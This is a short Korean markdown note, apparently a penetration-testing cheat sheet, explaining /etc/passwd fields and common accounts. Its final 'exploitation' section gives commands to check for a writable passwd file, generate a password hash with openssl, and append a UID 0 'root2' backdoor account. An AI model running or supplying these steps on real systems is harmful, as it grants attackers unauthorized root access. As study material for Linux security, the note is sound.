# /etc/passwd 분석

## 구조

```
username:password:UID:GID:GECOS:home_dir:shell
```

- `username`: 로그인 계정명
- `password`: 'x' 표시는 /etc/shadow에 암호 저장됨
- `UID`: 사용자 ID (0=root, <1000=시스템 계정, ≥1000=일반 사용자)
- `GID`: 기본 그룹 ID
- `GECOS`: 사용자 정보 필드(이름, 연락처 등)
- `home_dir`: 홈 디렉토리 경로
- `shell`: 로그인 시 실행되는 기본 쉘

## 주요 계정 식별

```
root:x:0:0:root:/root:/bin/bash    # 관리자 계정
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin    # 최소 권한 계정
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    # 웹 서버 계정
```

## 취약점 활용

- 쓰기 가능한 /etc/passwd 확인: `ls -la /etc/passwd`
- 해시 없는 계정 검색: `grep -v ':x:' /etc/passwd`
- OpenSSL로 암호 생성: `openssl passwd -1 -salt xyz password`
- 루트 계정 추가: `echo 'root2:$1$xyz$kL.GVc1d6R.Fw5SYW1tD//:0:0:root:/root:/bin/bash' >> /etc/passwd`
